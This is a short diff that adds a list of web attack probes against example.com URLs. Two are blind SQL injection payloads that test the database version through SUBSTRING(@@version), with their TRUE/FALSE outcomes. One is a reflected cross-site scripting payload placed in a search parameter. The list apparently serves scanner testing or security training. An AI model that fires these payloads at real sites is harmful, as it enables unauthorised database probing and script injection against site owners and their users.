@@ -1,0 +1,5 @@
+http://www.example.com/list.php?pagenum=0&catid=4+AND%20SUBSTRING(@@version,1,1)=5 TRUE
+http://www.example.com/list.php?pagenum=0&catid=4+AND%20SUBSTRING(@@version,1,1)=4 FALSE
+  
+http://www.example.com/results.php?searchquery=1&lt;script&gt;alert(308297104532)&lt;/script&gt;&search=Search
+
